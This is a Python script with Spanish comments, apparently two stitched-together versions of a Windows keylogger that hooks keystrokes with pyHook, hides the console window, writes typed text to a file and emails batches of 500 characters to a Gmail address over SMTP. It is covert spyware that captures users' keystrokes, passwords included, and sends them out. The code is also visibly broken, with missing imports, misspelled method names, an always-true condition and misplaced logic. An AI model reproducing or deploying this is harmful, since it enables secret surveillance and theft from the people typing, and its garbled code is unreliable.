import sys
import pyHook #Es necesario que la version de python que tenemos coincida con la version de pyhook
import pythoncom
import win32console
import  logging

archivo='miRuta/teclasPulsadas.txt'

def onKeyBoardEvent(event):
    logging.basicConfig(fileName=archivo, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager=pyHook.HookManager()
hooks_manager.keyDown=onKeyBoardEvent
hooks_manager.hookKeyBoard()
pythoncom.PumpMessages()















win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

# crea un archivo .txt en el cual sera guardado lo que ha pulsado el usuario
f = open("c:output.txt", "w+")
f.close

# Esta variable sirve para contar cuantas teclas ha presionado el usuario
count = 0


#Esta funcion se encarga de enviar el email

def enviar_email(mensaje):
    try:

        # Datos
        emisor = 'tuCorreo@gmail.com'
        destinatario = 'tuCorreo@gmail.com'
        nombreUsuario = 'tuCorreo@gmail.com'
        password = 'tuContraseña'

        # A continuación enviamos el correo
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(nombreUsuario, password)
        server.sendmail(emisor, destinatario, mensaje)
        server.quit()

    except:

        pass

#Esta funcion se encarga de captura las teclas pulsadas y enviarlas a un archivo .txt

def OnKeyboardEvent(event):
    global count
    count += 1
    # presiona CTRL+E para salir
    if event.Ascii == 5:
        sys.exit(0)

    if event.Ascii != 0 or 8:
        # abre output.txt
        f = open('c:output.txt', 'r+')
        buffer = f.read()
        f.close()

        if len(buffer) == 1:
            enviar_email("Arranco...")

        elif count == 500:
            # Envia los ultimos 500 caracteres que se han escrito
            capturado = buffer[-500:].replace("n", "")
            enviar_email(capturado)
            count = 0

            # abre output.txt escribe y suma nuevas teclas pulsadas
            f = open('c:output.txt', 'w')
            keylogs = chr(event.Ascii)

            # si se presiona ENTER EL numero 13 es el codigo ASCII equivalente a la tecla Enter
            if event.Ascii == 13:
                keylogs = 'n'

            # si se presiona espacio. EL numero 32 es el codigo ASCII equivalente a la tecla de espacio
            if event.Ascii == 32:
                keylogs = ''

            buffer += keylogs
            f.write(buffer)
            f.close()

            # creamos el objeto hook manager
            hm = pyHook.HookManager()
            hm.KeyDown = OnKeyboardEvent
            # capturamos la tecla pulsada
            hm.HookKeyboard()

            pythoncom.PumpMessages()

